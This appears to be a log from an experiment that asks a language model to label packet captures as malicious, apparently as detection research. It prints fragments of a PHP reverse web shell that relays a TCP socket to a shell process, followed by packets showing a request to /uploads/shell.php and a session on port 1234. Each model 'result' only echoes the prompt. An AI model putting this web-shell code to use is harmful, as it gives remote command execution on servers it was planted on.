+Result from the packet file:[{'generated_text': '\n    As the payload is large, we will split the payload into 8 parts.\n    Here is part 7 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:\n    Protocol: IP\n    Payload: if (feof($pipes[1])) {\\n\\t\\tprintit("ERROR: Shell process terminated");\\n\\t\\tbreak;\\n\\t}\\n\\n\\t// Wait until a command is end down $sock, or some\\n\\t// command output is available on STDOUT or STDERR\\n\\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n\\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n\\n\\t// If we can read from the TCP socket, send\\n\\t// data to process\\\'s STDIN\\n\\tif (in_array($sock, $read_a)) {\\n\\t\\tif ($debug) printit("SOCK READ");\\n\\t\\t$input = fread($sock, $chunk_size);\\n\\t\\tif ($debug) printit("SOCK: $input");\\n\\t\\tfwrite($pipes[0], $input);\\n\\t}\\n\\n\\t// If we can read from the process\\\'s STDOUT\\n\\t// send data down tcp connection\\n\\tif (in_array($pipes[1], $read_a)) {\\n\\t\\tif ($debug) printit("STDOUT READ");\\n\\t\\t$input = fread($pipes[1], $chun\n    Packet: 12\n    \n'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    As the payload is large, we will split the payload into 8 parts.
+    Here is part 8 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:
+    Protocol: IP
+    Payload: k_size);\n\t\tif ($debug) printit("STDOUT: $input");\n\t\tfwrite($sock, $input);\n\t}\n\n\t// If we can read from the process\'s STDERR\n\t// send data down tcp connection\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit("STDERR READ");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit("STDERR: $input");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we\'ve daemonised ourself\n// (I can\'t figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint "$string\\n";\n\t}\n}\n\n?> \n\n\n\n' |>>>
+    Packet: 12
+    
+
+
+Result from the packet file:[{'generated_text': '\n    As the payload is large, we will split the payload into 8 parts.\n    Here is part 8 of the payload,Do not provide explanation, Only respond if its Malicious or Not-Malicious.:\n    Protocol: IP\n    Payload: k_size);\\n\\t\\tif ($debug) printit("STDOUT: $input");\\n\\t\\tfwrite($sock, $input);\\n\\t}\\n\\n\\t// If we can read from the process\\\'s STDERR\\n\\t// send data down tcp connection\\n\\tif (in_array($pipes[2], $read_a)) {\\n\\t\\tif ($debug) printit("STDERR READ");\\n\\t\\t$input = fread($pipes[2], $chunk_size);\\n\\t\\tif ($debug) printit("STDERR: $input");\\n\\t\\tfwrite($sock, $input);\\n\\t}\\n}\\n\\nfclose($sock);\\nfclose($pipes[0]);\\nfclose($pipes[1]);\\nfclose($pipes[2]);\\nproc_close($process);\\n\\n// Like print, but does nothing if we\\\'ve daemonised ourself\\n// (I can\\\'t figure out how to redirect STDOUT like a proper daemon)\\nfunction printit ($string) {\\n\\tif (!$daemon) {\\n\\t\\tprint "$string\\\\n";\\n\\t}\\n}\\n\\n?> \\n\\n\\n\\n\' |>>>\n    Packet: 12\n    \n'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    All the parts of the payload in the packet are provided, please analyze them as a whole
+    and categorize whether they are malicious or not. Do not provide explanation, Only respond if its Malicious or Not-Malicious.
+    
+
+
+Result from the packet file:[{'generated_text': '\n    All the parts of the payload in the packet are provided, please analyze them as a whole\n    and categorize whether they are malicious or not. Do not provide explanation, Only respond if its Malicious or Not-Malicious.\n    \n'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 13
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=11192 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8ca8 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533307862 ack=3057699877 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655211, 6176820))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 13\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=11192 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8ca8 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533307862 ack=3057699877 dataofs=8 reserved=0 flags=A window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655211, 6176820))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 14
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=11193 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8ca7 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533307862 ack=3057699878 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655219, 6176820))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 14\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=11193 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8ca7 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533307862 ack=3057699878 dataofs=8 reserved=0 flags=FA window=501 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975655219, 6176820))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 15
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=52120 flags=DF frag=0 ttl=64 proto=tcp chksum=0xecbf src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=32788 dport=http seq=3727656671 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975659868, 0)), ('NOP', None), ('WScale', 7)] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 15\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=52120 flags=DF frag=0 ttl=64 proto=tcp chksum=0xecbf src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=32788 dport=http seq=3727656671 ack=0 dataofs=10 reserved=0 flags=S window=64240 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975659868, 0)), ('NOP', None), ('WScale', 7)] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 16
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=52121 flags=DF frag=0 ttl=64 proto=tcp chksum=0xecc6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=32788 dport=http seq=3727656672 ack=1145302888 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659869, 6177985))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 16\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=52121 flags=DF frag=0 ttl=64 proto=tcp chksum=0xecc6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=32788 dport=http seq=3727656672 ack=1145302888 dataofs=8 reserved=0 flags=A window=502 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659869, 6177985))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 17
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=406 id=52122 flags=DF frag=0 ttl=64 proto=tcp chksum=0xeb63 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=32788 dport=http seq=3727656672 ack=1145302888 dataofs=8 reserved=0 flags=PA window=502 chksum=0x83ec urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659869, 6177985))] |<Raw  load='GET /uploads/shell.php HTTP/1.1\r\nHost: 192.168.0.121\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n\r\n' |>>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 17\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=406 id=52122 flags=DF frag=0 ttl=64 proto=tcp chksum=0xeb63 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=32788 dport=http seq=3727656672 ack=1145302888 dataofs=8 reserved=0 flags=PA window=502 chksum=0x83ec urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659869, 6177985))] |<Raw  load='GET /uploads/shell.php HTTP/1.1\\r\\nHost: 192.168.0.121\\r\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: keep-alive\\r\\nUpgrade-Insecure-Requests: 1\\r\\n\\r\\n' |>>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 18
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=0 flags=DF frag=0 ttl=64 proto=tcp chksum=0xb858 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043394 ack=1082981486 dataofs=10 reserved=0 flags=SA window=65160 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975659878, 6177987)), ('NOP', None), ('WScale', 7)] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 18\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=60 id=0 flags=DF frag=0 ttl=64 proto=tcp chksum=0xb858 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043394 ack=1082981486 dataofs=10 reserved=0 flags=SA window=65160 chksum=0x8292 urgptr=0 options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (975659878, 6177987)), ('NOP', None), ('WScale', 7)] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 19
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=24424 flags=DF frag=0 ttl=64 proto=tcp chksum=0x58f8 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043395 ack=1082981609 dataofs=8 reserved=0 flags=A window=509 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659886, 6177989))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 19\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=24424 flags=DF frag=0 ttl=64 proto=tcp chksum=0x58f8 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043395 ack=1082981609 dataofs=8 reserved=0 flags=A window=509 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659886, 6177989))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 20
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=24425 flags=DF frag=0 ttl=64 proto=tcp chksum=0x58f7 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043395 ack=1082981808 dataofs=8 reserved=0 flags=A window=508 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659896, 6177992))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 20\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=24425 flags=DF frag=0 ttl=64 proto=tcp chksum=0x58f7 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043395 ack=1082981808 dataofs=8 reserved=0 flags=A window=508 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659896, 6177992))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 21
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=24426 flags=DF frag=0 ttl=64 proto=tcp chksum=0x58f6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043395 ack=1082981862 dataofs=8 reserved=0 flags=A window=508 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659900, 6177992))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 21\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=24426 flags=DF frag=0 ttl=64 proto=tcp chksum=0x58f6 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043395 ack=1082981862 dataofs=8 reserved=0 flags=A window=508 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659900, 6177992))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 22
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=24427 flags=DF frag=0 ttl=64 proto=tcp chksum=0x58f5 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043395 ack=1082981874 dataofs=8 reserved=0 flags=A window=508 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659904, 6177993))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 22\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=24427 flags=DF frag=0 ttl=64 proto=tcp chksum=0x58f5 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043395 ack=1082981874 dataofs=8 reserved=0 flags=A window=508 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659904, 6177993))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Packet: 23
+    Protocol: IP
+    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=24428 flags=DF frag=0 ttl=64 proto=tcp chksum=0x58f4 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043395 ack=1082981917 dataofs=8 reserved=0 flags=A window=508 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659905, 6177994))] |>>
+    
+
+
+Result from the packet file:[{'generated_text': "\n    Packet: 23\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=52 id=24428 flags=DF frag=0 ttl=64 proto=tcp chksum=0x58f4 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=1234 dport=44365 seq=2582043395 ack=1082981917 dataofs=8 reserved=0 flags=A window=508 chksum=0x828a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (975659905, 6177994))] |>>\n    \n"}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+    Based on all the packets sent above , is the packet capture malicious or an attack on the server/network ?
+    Provide response either `Malicious` or `Not-Malicious` 
+    
+
+
+Result from the packet file:[{'generated_text': '\n    Based on all the packets sent above , is the packet capture malicious or an attack on the server/network ?\n    Provide response either `Malicious` or `Not-Malicious` \n    \n'}]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
